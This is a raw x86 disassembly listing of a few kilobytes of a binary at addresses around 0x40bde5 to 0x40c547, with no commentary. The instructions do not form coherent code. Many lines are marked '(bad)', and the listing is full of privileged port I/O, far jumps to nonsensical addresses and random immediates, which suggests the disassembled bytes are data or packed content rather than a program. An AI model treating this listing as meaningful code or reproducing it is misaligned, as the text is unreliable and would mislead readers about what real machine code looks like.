  40bde5:	and    al,0xd7
  40bde7:	cmp    BYTE PTR ds:0x8bde2421,ah
  40bded:	mov    al,ds:0xe5705153
  40bdf2:	adc    esp,eax
  40bdf4:	pop    ebx
  40bdf5:	cmp    BYTE PTR [esi],bl
  40bdf7:	pop    esp
  40bdf8:	es leave 
  40bdfa:	mov    esi,0x723ade0c
  40bdff:	lods   eax,DWORD PTR ds:[esi]
  40be00:	imul   BYTE PTR [ebx+0x5c6c3110]
  40be06:	inc    eax
  40be07:	(bad)  
  40be08:	xchg   esi,eax
  40be09:	pusha  
  40be0a:	mov    eax,0x81a64374
  40be0f:	jle    0x40bda5
  40be11:	in     al,dx
  40be12:	pushf  
  40be13:	arpl   WORD PTR [edi+0x3f],di
  40be16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be17:	dec    edx
  40be18:	bswap  esp
  40be1a:	(bad)  [ecx+0x51]
  40be1d:	and    eax,0xedc4a952
  40be22:	stos   DWORD PTR es:[edi],eax
  40be23:	ss inc eax
  40be25:	jns    0x40be30
  40be27:	xor    BYTE PTR [ebx],dl
  40be29:	ss jg  0x40be6d
  40be2c:	ins    BYTE PTR es:[edi],dx
  40be2d:	jp     0x40be00
  40be2f:	push   0xffffff8f
  40be31:	sahf   
  40be32:	clc    
  40be33:	retf   
  40be34:	loopne 0x40be1a
  40be36:	clc    
  40be37:	dec    esi
  40be38:	xchg   edx,eax
  40be39:	pusha  
  40be3a:	loop   0x40be33
  40be3c:	adc    eax,0xf2cd0070
  40be41:	add    ch,BYTE PTR [ebx-0x36]
  40be44:	dec    ebx
  40be45:	imul   ecx,DWORD PTR [edx-0x1d8e9bc6],0xffffffb2
  40be4c:	pop    esp
  40be4d:	test   DWORD PTR [edx-0x61],esp
  40be50:	int    0x3e
  40be52:	dec    eax
  40be53:	push   ebp
  40be54:	lock pop ecx
  40be56:	rcl    BYTE PTR [edx-0x63ad32a7],cl
  40be5c:	dec    edx
  40be5d:	popa   
  40be5e:	lea    ecx,[edx+0x33538b32]
  40be64:	jmp    0x40bece
  40be66:	sub    bh,BYTE PTR [esi+0x11]
  40be69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be6a:	mov    bh,0x75
  40be6c:	and    bh,bl
  40be6e:	ins    BYTE PTR es:[edi],dx
  40be6f:	mov    cl,0x5d
  40be71:	cdq    
  40be72:	sti    
  40be73:	(bad)
  40be77:	fdivp  st(7),st
  40be79:	icebp  
  40be7a:	lods   eax,DWORD PTR ds:[esi]
  40be7b:	test   eax,0xd89f5027
  40be80:	les    edx,FWORD PTR [eax-0x80]
  40be83:	inc    edi
  40be84:	imul   edi,esp,0x3b
  40be87:	cmc    
  40be88:	pusha  
  40be89:	mov    ds,WORD PTR [ecx]
  40be8b:	sbb    DWORD PTR [esi+edx*4],ecx
  40be8e:	jmp    0x255dd4b0
  40be93:	(bad)  [edi]
  40be95:	inc    edi
  40be96:	jecxz  0x40be53
  40be98:	je     0x40bf17
  40be9a:	pop    eax
  40be9b:	hlt    
  40be9c:	(bad)
  40be9f:	scas   eax,DWORD PTR es:[edi]
  40bea0:	sub    dh,cl
  40bea2:	mov    WORD PTR [ebp-0x441be393],ss
  40bea8:	data16 not ch
  40beab:	add    BYTE PTR [esi+0x5860fc40],dl
  40beb1:	iret   
  40beb2:	in     al,dx
  40beb3:	inc    esi
  40beb4:	daa    
  40beb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beb6:	mov    cl,0x2c
  40beb8:	clc    
  40beb9:	popf   
  40beba:	add    ecx,ebx
  40bebc:	and    DWORD PTR [eax-0x698ab8f6],esp
  40bec2:	push   cs
  40bec3:	fwait
  40bec4:	add    ecx,ebx
  40bec6:	adc    edx,eax
  40bec8:	fisub  WORD PTR [ecx+0x583fb3d9]
  40bece:	inc    edx
  40becf:	pop    edi
  40bed0:	fild   WORD PTR ds:0xa2c5f7a8
  40bed6:	cli    
  40bed7:	sbb    dh,ch
  40bed9:	test   al,0xb6
  40bedb:	(bad)  
  40bedc:	sub    al,0xf4
  40bede:	xor    ecx,DWORD PTR [edx-0x6b]
  40bee1:	in     al,0x26
  40bee3:	dec    ebp
  40bee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bee5:	push   0xffffff90
  40bee7:	das    
  40bee8:	mov    ds:0xcfed0c27,eax
  40beed:	pusha  
  40beee:	and    DWORD PTR [esp+ebx*2+0x13a0451],edx
  40bef5:	xchg   ebx,eax
  40bef6:	push   cs
  40bef7:	enter  0x6dff,0x63
  40befb:	shl    BYTE PTR [eax+0x22],0x2c
  40beff:	inc    ebp
  40bf00:	cmp    ch,BYTE PTR [ecx-0x12abfc18]
  40bf06:	jmp    0x57d48d74
  40bf0b:	cld    
  40bf0c:	sbb    eax,0xf5c1a79c
  40bf11:	(bad)  
  40bf12:	xor    BYTE PTR [edx+0x3570d9e4],dl
  40bf18:	jo     0x40bf23
  40bf1a:	shl    DWORD PTR [ebx+eax*4-0x39],cl
  40bf1e:	pop    ds
  40bf1f:	pop    edi
  40bf20:	test   eax,0xbaf3d375
  40bf25:	imul   edx,DWORD PTR [esi-0x59db7d3a],0xff6cd53e
  40bf2f:	fstp   TBYTE PTR [eax+0x1a6758bf]
  40bf35:	(bad)  
  40bf36:	mov    ebp,0x4c4473a6
  40bf3b:	sbb    eax,0xc2de439d
  40bf40:	ret    
  40bf41:	mov    ds:0x8f849ba8,al
  40bf46:	hlt    
  40bf47:	push   ss
  40bf48:	push   es
  40bf49:	es pop ss
  40bf4b:	mov    ch,0xeb
  40bf4d:	sub    ah,al
  40bf4f:	addr16 daa 
  40bf51:	data16 fdivrp st(6),st
  40bf54:	in     eax,dx
  40bf55:	fcmovnu st,st(3)
  40bf57:	addr16 push esi
  40bf59:	or     al,0xe2
  40bf5b:	and    al,bl
  40bf5d:	xchg   edx,eax
  40bf5e:	cmp    ecx,DWORD PTR ds:0xdf006cea
  40bf64:	jle    0x40bf18
  40bf66:	mov    DWORD PTR [edi],esp
  40bf68:	out    0xae,eax
  40bf6a:	cmp    DWORD PTR [ecx+0x7a],ebp
  40bf6d:	(bad)  
  40bf6e:	adc    bh,BYTE PTR [esi-0x34]
  40bf71:	ja     0x40bfdd
  40bf73:	mov    ds:0xa4fe9427,eax
  40bf78:	pushf  
  40bf79:	sbb    eax,ebx
  40bf7b:	pop    ebp
  40bf7c:	psrld  mm7,QWORD PTR [esi+edi*4+0x13]
  40bf81:	mov    ch,0x85
  40bf83:	lods   al,BYTE PTR ds:[esi]
  40bf84:	sar    DWORD PTR [ecx-0x35],cl
  40bf87:	fnstcw WORD PTR [esi+0x2d]
  40bf8a:	jno    0x40bf8d
  40bf8c:	jle    0x40bfd5
  40bf8e:	jg     0x40bf83
  40bf90:	adc    al,0x92
  40bf92:	mov    edx,0xa1f2339c
  40bf97:	popf   
  40bf98:	enter  0x9240,0xb1
  40bf9c:	ror    BYTE PTR [edx],cl
  40bf9e:	pop    ebx
  40bf9f:	fcmovnu st,st(2)
  40bfa1:	stc    
  40bfa2:	push   eax
  40bfa3:	inc    ecx
  40bfa4:	pop    ss
  40bfa5:	xchg   edi,eax
  40bfa6:	sub    eax,0xc7d86a25
  40bfab:	add    BYTE PTR [eax+ebp*2+0x73],ah
  40bfaf:	jne    0x40bfc9
  40bfb1:	and    ecx,DWORD PTR [esi-0x6d819524]
  40bfb7:	mov    ebx,0xff3fac93
  40bfbc:	pop    ebx
  40bfbd:	repz push eax
  40bfbf:	dec    ecx
  40bfc0:	jmp    0xb283b9f3
  40bfc5:	sti    
  40bfc6:	mov    dl,0x25
  40bfc8:	pop    esp
  40bfc9:	xchg   ebx,eax
  40bfca:	pop    edi
  40bfcb:	mov    esi,0x6c053a6f
  40bfd0:	mov    edi,0xa390b58f
  40bfd5:	xor    BYTE PTR [esi+0x6c],bh
  40bfd8:	add    al,0xe7
  40bfda:	sub    eax,0x67069fa4
  40bfdf:	test   bl,dh
  40bfe1:	clc    
  40bfe2:	mov    ss,WORD PTR [ecx-0x16050ba9]
  40bfe8:	mov    eax,ds:0x233566c7
  40bfed:	cmc    
  40bfee:	sub    ecx,eax
  40bff0:	sbb    DWORD PTR [edx-0x538772f],edx
  40bff6:	mov    edx,0x72888340
  40bffb:	jnp    0x40bf94
  40bffd:	jmp    0x40c055
  40bfff:	bound  edi,QWORD PTR [eax+0x27c89a56]
  40c005:	test   BYTE PTR [ecx],ch
  40c007:	mov    dh,0x6a
  40c009:	dec    edx
  40c00a:	fmul   QWORD PTR [eax]
  40c00c:	(bad)  
  40c00d:	aam    0xf1
  40c00f:	loop   0x40c041
  40c011:	shr    DWORD PTR [ecx+0x2866d003],1
  40c017:	fisttp WORD PTR [eax-0x2335be25]
  40c01d:	(bad)  
  40c01e:	(bad)  
  40c01f:	jl     0x40c098
  40c021:	xchg   dh,ah
  40c023:	and    BYTE PTR [eax+ebp*4+0x4be34eb6],dl
  40c02a:	popa   
  40c02b:	add    DWORD PTR [edx+0xd2ffc2f],ebx
  40c031:	cwde   
  40c032:	rcr    al,cl
  40c034:	inc    ecx
  40c035:	icebp  
  40c036:	jno    0x40bff1
  40c038:	cmp    al,0x29
  40c03a:	gs mov ecx,0xcd599b8e
  40c040:	stos   DWORD PTR es:[edi],eax
  40c041:	aam    0x24
  40c043:	push   0xfffffffe
  40c045:	xchg   DWORD PTR [ecx],ecx
  40c047:	jl     0x40c077
  40c049:	not    BYTE PTR [ecx-0x2f]
  40c04c:	add    al,0x4b
  40c04e:	cmp    al,0x7f
  40c050:	and    al,0xf6
  40c052:	out    dx,al
  40c053:	lahf   
  40c054:	xchg   DWORD PTR [edi+eiz*8-0x23],ebp
  40c058:	pusha  
  40c059:	lods   al,BYTE PTR ds:[esi]
  40c05a:	push   cs
  40c05b:	int    0x11
  40c05d:	es mov ch,0xa1
  40c060:	(bad)  
  40c061:	xor    dl,bh
  40c063:	repnz in al,0x9d
  40c066:	pop    edx
  40c067:	icebp  
  40c068:	xchg   ebx,eax
  40c069:	mov    al,ds:0x81b98d6d
  40c06e:	jnp    0x40c08f
  40c070:	xchg   esp,eax
  40c071:	adc    DWORD PTR [ebx+ebx*2-0x5a],0x9f7e4bf1
  40c079:	icebp  
  40c07a:	fdivr  QWORD PTR [ebp-0x40a1eef2]
  40c080:	scas   eax,DWORD PTR es:[edi]
  40c081:	mov    ebp,0xc7370cee
  40c086:	mov    ds:0x810a10c4,eax
  40c08b:	(bad)  
  40c08c:	cdq    
  40c08d:	mov    ah,0xee
  40c08f:	inc    ebx
  40c090:	mov    cl,0xec
  40c092:	cmc    
  40c093:	jmp    edi
  40c095:	cwde   
  40c096:	sbb    BYTE PTR [ecx+0x1b],ah
  40c099:	sub    edx,ebp
  40c09b:	cs fs inc ebx
  40c09e:	jnp    0x40c070
  40c0a0:	xlat   BYTE PTR ds:[ebx]
  40c0a1:	test   DWORD PTR [esp+esi*4],ecx
  40c0a4:	pop    edi
  40c0a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0a6:	ja     0x40c092
  40c0a8:	dec    eax
  40c0a9:	adc    BYTE PTR [edi],ch
  40c0ab:	imul   eax,DWORD PTR [esi+esi*8+0x4d6e2797],0x4d
  40c0b3:	inc    esi
  40c0b4:	inc    ebx
  40c0b5:	fmul   QWORD PTR [edx]
  40c0b7:	out    0xce,al
  40c0b9:	bound  edi,QWORD PTR [esi-0xcb6a8cf]
  40c0bf:	fsubr  QWORD PTR ss:[edi+0x3d]
  40c0c3:	je     0x40c11f
  40c0c5:	pop    ecx
  40c0c6:	mov    eax,ds:0x19cedccf
  40c0cb:	rol    DWORD PTR [esi],0x1b
  40c0ce:	not    DWORD PTR [esi]
  40c0d0:	mov    cl,0x14
  40c0d2:	and    bl,BYTE PTR [ebx]
  40c0d4:	lods   eax,DWORD PTR ds:[esi]
  40c0d5:	mov    ebx,0x4505c354
  40c0da:	push   cs
  40c0db:	ins    DWORD PTR es:[edi],dx
  40c0dc:	mov    ds:0x1eb2592a,eax
  40c0e1:	jae    0x40c09a
  40c0e3:	loopne 0x40c09c
  40c0e5:	in     al,dx
  40c0e6:	fdivr  QWORD PTR [eax]
  40c0e8:	pusha  
  40c0e9:	cmp    edx,edi
  40c0eb:	lods   eax,DWORD PTR ds:[esi]
  40c0ec:	aaa    
  40c0ed:	div    DWORD PTR [edi]
  40c0ef:	imul   ebx,eax,0x5e4522
  40c0f5:	jmp    0x6d6b:0xf24630fa
  40c0fc:	pop    es
  40c0fd:	cmp    bl,bh
  40c0ff:	or     al,0x15
  40c101:	pop    esi
  40c102:	xor    ch,BYTE PTR [esi-0x38]
  40c105:	xchg   edi,eax
  40c106:	mov    cl,0x65
  40c108:	cwde   
  40c109:	mov    dh,0xcd
  40c10b:	mov    BYTE PTR [eax-0xe],dl
  40c10e:	jmp    0x40c11d
  40c110:	xor    ebx,ebx
  40c112:	test   BYTE PTR [eax+0x7b],al
  40c115:	and    cl,ah
  40c117:	jmp    0x40c0ab
  40c119:	stos   DWORD PTR es:[edi],eax
  40c11a:	jmp    0xb33e:0x396cfb64
  40c121:	aam    0x91
  40c123:	xor    ecx,DWORD PTR [edx-0x3c]
  40c126:	pop    ecx
  40c127:	lds    esi,FWORD PTR [ebx-0x24]
  40c12a:	pop    ss
  40c12b:	and    ecx,eax
  40c12d:	adc    al,0x6f
  40c12f:	test   dl,dh
  40c131:	inc    ebp
  40c132:	leave  
  40c133:	adc    DWORD PTR [ebp-0x7a689c57],0xcd5355cd
  40c13d:	stc    
  40c13e:	loopne 0x40c138
  40c140:	lods   eax,DWORD PTR ds:[esi]
  40c141:	test   ecx,edx
  40c143:	and    al,BYTE PTR [ecx+0x317059bf]
  40c149:	leave  
  40c14a:	(bad)  
  40c14b:	loope  0x40c137
  40c14d:	xor    ebp,ebp
  40c14f:	push   ebp
  40c150:	lock out dx,eax
  40c152:	mov    ah,0x7b
  40c154:	xchg   BYTE PTR [esi-0xb5b068],ah
  40c15a:	retf   0xa49a
  40c15d:	push   ebx
  40c15e:	div    al
  40c160:	out    dx,al
  40c161:	(bad)  
  40c163:	pop    ebp
  40c164:	mov    edx,0x374b0646
  40c169:	das    
  40c16a:	jbe    0x40c126
  40c16c:	jecxz  0x40c1b7
  40c16e:	xchg   ebx,eax
  40c16f:	(bad)  
  40c170:	jne    0x40c153
  40c172:	adc    eax,0xad3a3eb9
  40c177:	scas   al,BYTE PTR es:[edi]
  40c178:	cs jne 0x40c1ad
  40c17b:	push   ss
  40c17c:	int3   
  40c17d:	test   al,0x9
  40c17f:	add    BYTE PTR [esi],bl
  40c181:	mov    ds:0x9b4f66af,al
  40c186:	ret    
  40c187:	sti    
  40c188:	sbb    eax,0x86677b0
  40c18d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c18e:	cli    
  40c18f:	add    cl,BYTE PTR [ebx+0x24]
  40c192:	cmc    
  40c193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c194:	es pop es
  40c196:	adc    al,0xeb
  40c198:	pop    ss
  40c199:	clc    
  40c19a:	add    eax,0xa81f3824
  40c19f:	inc    ecx
  40c1a0:	or     BYTE PTR [ecx],bh
  40c1a2:	jg     0x40c19c
  40c1a4:	test   al,0x64
  40c1a6:	mov    al,0x9e
  40c1a8:	pop    eax
  40c1a9:	fdivr  st(3),st
  40c1ab:	dec    eax
  40c1ac:	add    BYTE PTR [eax],dl
  40c1ae:	sub    al,0x83
  40c1b0:	sbb    bh,0xa8
  40c1b3:	xchg   edi,eax
  40c1b4:	mov    bl,0x66
  40c1b6:	in     al,dx
  40c1b7:	pushf  
  40c1b8:	test   ch,0x5
  40c1bb:	push   es
  40c1bc:	and    dl,0xc9
  40c1bf:	in     eax,0x89
  40c1c1:	cli    
  40c1c2:	lods   al,BYTE PTR ds:[esi]
  40c1c3:	fild   QWORD PTR [esi+0x407cb13e]
  40c1c9:	cmp    DWORD PTR [ecx],0x393dc729
  40c1cf:	sbb    eax,0x5fc28c1f
  40c1d4:	stc    
  40c1d5:	inc    DWORD PTR [ebx-0x40e37010]
  40c1db:	or     BYTE PTR [esi-0x78],ch
  40c1de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1df:	mov    gs,ecx
  40c1e1:	inc    edi
  40c1e2:	ins    DWORD PTR es:[edi],dx
  40c1e3:	jne    0x40c1e3
  40c1e5:	pop    es
  40c1e6:	dec    ebp
  40c1e7:	jns    0x40c220
  40c1e9:	push   edx
  40c1ea:	adc    BYTE PTR [edi-0x46089720],ah
  40c1f0:	jae    0x40c1e1
  40c1f2:	pop    ebx
  40c1f3:	mov    DWORD PTR [ecx-0x2f2c036a],esp
  40c1f9:	jl     0x40c19e
  40c1fb:	jecxz  0x40c1a9
  40c1fd:	ror    BYTE PTR [ebp-0x48],0xb6
  40c201:	add    ch,BYTE PTR [esi]
  40c203:	cli    
  40c204:	xchg   edx,eax
  40c205:	dec    esi
  40c206:	jmp    0xf9f90aa2
  40c20b:	pop    ds
  40c20c:	cmp    DWORD PTR [edi],eax
  40c20e:	push   cs
  40c20f:	es mov edx,0x66e5b5cf
  40c215:	dec    esi
  40c216:	inc    ebp
  40c217:	pop    ebx
  40c218:	mov    ecx,0x13b97f3d
  40c21d:	ja     0x40c1c3
  40c21f:	add    bh,BYTE PTR [ebx-0x69]
  40c222:	out    dx,al
  40c223:	loopne 0x40c274
  40c225:	xor    esp,DWORD PTR [ebx+0x4ebad224]
  40c22b:	daa    
  40c22c:	cmp    al,0x27
  40c22e:	pop    edx
  40c22f:	sti    
  40c230:	nop
  40c231:	jmp    0x5fb4044d
  40c236:	aam    0x86
  40c238:	sub    ebp,DWORD PTR [esi+0xd]
  40c23b:	jp     0x40c250
  40c23d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c23e:	cld    
  40c23f:	dec    edi
  40c240:	mov    al,ds:0x97d796be
  40c245:	loop   0x40c283
  40c247:	shr    BYTE PTR [ebx],0xb7
  40c24a:	or     eax,0xe7648df
  40c24f:	xchg   BYTE PTR [edi],dl
  40c251:	aaa    
  40c252:	mov    dl,0x75
  40c254:	jae    0x40c297
  40c256:	fwait
  40c257:	sub    BYTE PTR [ebp+0x664fb382],dh
  40c25d:	rcl    ebx,1
  40c25f:	jecxz  0x40c231
  40c261:	(bad)  
  40c263:	inc    edi
  40c264:	jle    0x40c279
  40c266:	cmp    eax,0xd8a906bd
  40c26b:	lea    ebp,[edx-0x36]
  40c26e:	cwde   
  40c26f:	aam    0x7c
  40c271:	jbe    0x40c253
  40c273:	leave  
  40c274:	sbb    ebx,DWORD PTR [ebx]
  40c276:	popa   
  40c277:	push   edx
  40c278:	inc    eax
  40c279:	xor    esp,DWORD PTR [eax-0x6a0dd2f6]
  40c27f:	out    0xe3,eax
  40c281:	push   edi
  40c282:	pop    eax
  40c283:	dec    edx
  40c284:	clc    
  40c285:	sub    BYTE PTR [eax-0x374429c5],cl
  40c28b:	sti    
  40c28c:	sar    DWORD PTR [eax],1
  40c28e:	ins    BYTE PTR es:[edi],dx
  40c28f:	dec    ecx
  40c290:	sbb    DWORD PTR [edx-0x26abde57],ecx
  40c296:	daa    
  40c297:	push   cs
  40c298:	fidiv  WORD PTR [ebx]
  40c29a:	lock inc ebx
  40c29c:	shl    DWORD PTR [edx+0x3ee8d27e],0x2a
  40c2a3:	clc    
  40c2a4:	inc    eax
  40c2a5:	rol    DWORD PTR [eax-0x6c],1
  40c2a8:	enter  0xa5dc,0xad
  40c2ac:	ror    DWORD PTR [edi+esi*8-0x50],0x7
  40c2b1:	mov    BYTE PTR cs:[edi+0x4f],ah
  40c2b5:	repnz and BYTE PTR [edx-0x43b20431],ch
  40c2bc:	(bad)  
  40c2bd:	push   cs
  40c2be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2bf:	lods   eax,DWORD PTR ds:[esi]
  40c2c0:	push   cs
  40c2c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2c2:	jle    0x40c302
  40c2c4:	pop    ss
  40c2c5:	or     eax,0x18f64eff
  40c2ca:	mov    bh,0xbc
  40c2cc:	xor    eax,0x2b6531d7
  40c2d1:	pop    edx
  40c2d2:	repnz push eax
  40c2d4:	into   
  40c2d5:	pop    esi
  40c2d6:	or     eax,0x16e0c46
  40c2db:	jge    0x40c27a
  40c2dd:	jb     0x40c2f4
  40c2df:	push   eax
  40c2e0:	adc    bh,0x7f
  40c2e3:	sahf   
  40c2e4:	jle    0x40c2df
  40c2e6:	jl     0x40c34b
  40c2e8:	pop    ecx
  40c2e9:	in     eax,0xa6
  40c2eb:	loopne 0x40c286
  40c2ed:	adc    BYTE PTR [ecx],dh
  40c2ef:	cmp    eax,0x3573d333
  40c2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2f5:	or     al,0x27
  40c2f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2f9:	leave  
  40c2fa:	cmp    edi,edi
  40c2fc:	xchg   edx,eax
  40c2fd:	add    BYTE PTR [ecx+ebx*2],bh
  40c300:	dec    eax
  40c301:	popa   
  40c302:	mov    bh,0xbe
  40c304:	inc    eax
  40c305:	jl     0x40c28b
  40c307:	in     al,0x7a
  40c309:	mov    ebx,0x95cf064b
  40c30e:	dec    esi
  40c30f:	mov    dl,BYTE PTR [eax-0x1b668e07]
  40c315:	das    
  40c316:	xchg   DWORD PTR [edx+0x5a29790c],ebx
  40c31c:	inc    edi
  40c31d:	int    0x95
  40c31f:	push   0x884ec411
  40c324:	jecxz  0x40c353
  40c326:	bound  bx,DWORD PTR [eax]
  40c329:	push   ebx
  40c32a:	pop    ebp
  40c32b:	cld    
  40c32c:	arpl   WORD PTR [eax],bp
  40c32e:	das    
  40c32f:	(bad)  
  40c330:	pop    eax
  40c331:	(bad)  
  40c332:	(bad)  
  40c333:	pop    esp
  40c334:	jle    0x40c37f
  40c336:	push   ds
  40c337:	jp     0x40c352
  40c339:	test   al,0x59
  40c33b:	in     eax,dx
  40c33c:	in     al,dx
  40c33d:	(bad)  
  40c33e:	mov    gs,WORD PTR [esi]
  40c340:	(bad)  
  40c341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c342:	adc    bh,BYTE PTR [ebp+0x6654d6a1]
  40c348:	jmp    0x40c33f
  40c34a:	push   0x99f15dd3
  40c34f:	pop    ss
  40c350:	mov    ah,0xbf
  40c352:	and    BYTE PTR [ebp-0x78],dh
  40c355:	push   eax
  40c356:	fwait
  40c357:	mov    dl,0xd
  40c359:	outs   dx,BYTE PTR ds:[esi]
  40c35a:	cmp    ebx,DWORD PTR [ebp-0x2]
  40c35d:	gs mov eax,es:0x2a1b50f4
  40c364:	lods   eax,DWORD PTR ds:[esi]
  40c365:	es mov dl,0x33
  40c368:	dec    edi
  40c36a:	lea    esp,[esi+ecx*4+0x720d737e]
  40c371:	ficomp DWORD PTR [ebx-0x6b]
  40c374:	mov    eax,ds:0x417f5ac3
  40c379:	inc    eax
  40c37a:	fldenv [edi+ecx*1]
  40c37d:	pop    eax
  40c37e:	xor    bh,al
  40c380:	loope  0x40c325
  40c382:	nop
  40c383:	adc    ebp,edi
  40c385:	sub    eax,0x8ab13fd2
  40c38a:	jns    0x40c3ec
  40c38c:	jle    0x40c36f
  40c38e:	shr    DWORD PTR [eax+0x70],0x53
  40c392:	cld    
  40c393:	mov    edi,0xda266f67
  40c398:	(bad)  
  40c399:	in     eax,dx
  40c39a:	out    0xe7,al
  40c39c:	xchg   ebp,eax
  40c39d:	dec    esi
  40c39e:	mov    bh,0xf9
  40c3a0:	ret    
  40c3a1:	mov    eax,ds:0x22ca53ea
  40c3a6:	call   0x3c93:0x41a202e5
  40c3ad:	ror    BYTE PTR [edx],1
  40c3af:	and    bh,al
  40c3b1:	cmp    BYTE PTR ds:0xe1ec20f8,0xc4
  40c3b8:	shl    BYTE PTR [esi-0x3189dbd5],0x63
  40c3bf:	xor    al,0x8
  40c3c1:	push   es
  40c3c2:	out    0x3c,eax
  40c3c4:	cwde   
  40c3c5:	scas   eax,DWORD PTR es:[edi]
  40c3c6:	loop   0x40c38f
  40c3c8:	dec    esi
  40c3c9:	inc    edi
  40c3ca:	or     esi,esp
  40c3cc:	mov    eax,ds:0x11f76cd3
  40c3d1:	sub    BYTE PTR [ebp+0x40],0xd9
  40c3d5:	ret    
  40c3d6:	cs or  al,0x89
  40c3d9:	jno    0x180fcc31
  40c3df:	inc    esp
  40c3e0:	jmp    0x347f:0xf9c2a2d5
  40c3e7:	jno    0x40c37a
  40c3e9:	retf   
  40c3ea:	or     eax,0xbbb5a63c
  40c3ef:	and    bl,bh
  40c3f1:	retf   0x78d8
  40c3f4:	out    dx,eax
  40c3f5:	jno    0x40c38e
  40c3f7:	pop    edx
  40c3f8:	dec    ebp
  40c3f9:	mov    esp,0xbefe6b16
  40c3fe:	sbb    dh,BYTE PTR gs:[edi+0x7068b705]
  40c405:	xor    esi,DWORD PTR [ecx+0x26]
  40c408:	pop    ds
  40c409:	cmc    
  40c40a:	mov    eax,ds:0xcc8ace04
  40c40f:	mov    al,ds:0x9579fcbc
  40c414:	dec    ebp
  40c415:	stos   DWORD PTR es:[edi],eax
  40c416:	out    dx,al
  40c417:	ficom  WORD PTR [ecx-0x1487a90c]
  40c41d:	push   edx
  40c41e:	jno    0x40c46c
  40c420:	mov    ebx,ecx
  40c422:	cmp    ebp,DWORD PTR [edx+0xe]
  40c425:	xchg   DWORD PTR [ebp-0xe078d5c],esp
  40c42b:	mov    dl,0x1a
  40c42d:	(bad)  
  40c42e:	in     al,dx
  40c42f:	loop   0x40c3dc
  40c431:	outs   dx,DWORD PTR ds:[esi]
  40c432:	sahf   
  40c433:	idiv   BYTE PTR ds:0xa660f137
  40c439:	lds    edi,FWORD PTR [ecx-0x2]
  40c43c:	push   esp
  40c43d:	sti    
  40c43e:	and    al,0xcb
  40c440:	or     al,0x50
  40c442:	shl    DWORD PTR ds:0xb465d362,0x56
  40c449:	pop    ss
  40c44a:	int3   
  40c44b:	add    bl,BYTE PTR [ecx+0x24]
  40c44e:	mov    eax,ds:0x232836bc
  40c453:	push   0x10632f19
  40c458:	es and ecx,esp
  40c45b:	out    0x78,al
  40c45d:	cwde   
  40c45e:	pop    ss
  40c45f:	sahf   
  40c460:	loope  0x40c447
  40c462:	fmul   QWORD PTR [edi+0x1b]
  40c465:	jno    0x40c3fb
  40c467:	sbb    esp,edi
  40c469:	jo     0x40c4ca
  40c46b:	mov    edi,esi
  40c46d:	ret    0x381b
  40c470:	mov    al,0x29
  40c472:	pop    esp
  40c473:	fucom  st(2)
  40c475:	or     eax,0xf2a45a4c
  40c47a:	sbb    ah,ah
  40c47c:	gs sub al,0xaf
  40c47f:	cmp    al,0x2e
  40c481:	pop    ds
  40c482:	push   esp
  40c483:	push   0x52066c81
  40c488:	lods   eax,DWORD PTR ds:[esi]
  40c489:	test   al,0x1c
  40c48b:	jb     0x40c4a5
  40c48d:	jns    0x40c450
  40c48f:	stos   BYTE PTR es:[edi],al
  40c490:	pop    ds
  40c491:	push   eax
  40c492:	imul   ecx,DWORD PTR [ebx-0x316d5693],0xa4894166
  40c49c:	jecxz  0x40c51c
  40c49e:	sub    al,0x87
  40c4a0:	cmp    dl,al
  40c4a2:	aas    
  40c4a3:	dec    ebx
  40c4a4:	clc    
  40c4a5:	mov    edi,0xcdb49cdb
  40c4aa:	and    BYTE PTR [esi+0x18],ch
  40c4ad:	push   ds
  40c4ae:	mov    ah,0x56
  40c4b0:	jmp    0x40c485
  40c4b2:	fist   DWORD PTR [ebp-0x35e25ea7]
  40c4b8:	or     dh,BYTE PTR [ebx-0x71]
  40c4bb:	pop    ebx
  40c4bc:	adc    eax,0x3032bec4
  40c4c1:	sub    ah,bh
  40c4c3:	mov    ds:0xb2ddd7f4,eax
  40c4c8:	cmp    eax,0x173d9ab6
  40c4cd:	adc    BYTE PTR [eax-0x4b],ch
  40c4d0:	push   esp
  40c4d1:	loope  0x40c514
  40c4d3:	or     eax,0x1e72fbf4
  40c4d8:	retf   0x1f8
  40c4db:	xor    DWORD PTR [eax+eax*4+0xf193015],0x5a
  40c4e3:	jl     0x5f5d5dd1
  40c4e9:	int3   
  40c4ea:	pop    ebp
  40c4eb:	data16 cmc 
  40c4ed:	mov    ds:0x16d4c760,eax
  40c4f2:	ret    
  40c4f3:	mov    cl,0x35
  40c4f5:	mov    dh,0xc3
  40c4f7:	dec    edx
  40c4f8:	stc    
  40c4f9:	dec    ebp
  40c4fa:	imul   ebx,DWORD PTR [ebp+0x547c276d],0xc0b67063
  40c504:	pop    es
  40c505:	xor    edi,ecx
  40c507:	in     eax,0x2d
  40c509:	pop    ss
  40c50a:	dec    eax
  40c50b:	and    al,BYTE PTR [edx]
  40c50d:	or     DWORD PTR [ebx-0x283cb62d],ebp
  40c513:	mov    eax,0x2ba19d8d
  40c518:	xchg   ebx,eax
  40c519:	or     eax,0xd8ba5e5f
  40c51e:	and    BYTE PTR [edx-0x10],ah
  40c521:	je     0x40c558
  40c523:	xchg   ebp,eax
  40c525:	aas    
  40c526:	pop    es
  40c527:	nop
  40c528:	or     ebp,DWORD PTR [eax-0x2342e19b]
  40c52e:	jg     0x40c586
  40c530:	and    DWORD PTR [ebx-0x432bc223],eax
  40c536:	pop    ebp
  40c538:	mov    WORD PTR [edx],cs
  40c53a:	test   al,0x6c
  40c53c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c53d:	outs   dx,BYTE PTR ds:[esi]
  40c53e:	mov    esp,0x3f082080
  40c543:	ret    0xd8dc
  40c546:	ins    BYTE PTR es:[edi],dx
  40c547:	in     al,0x6d
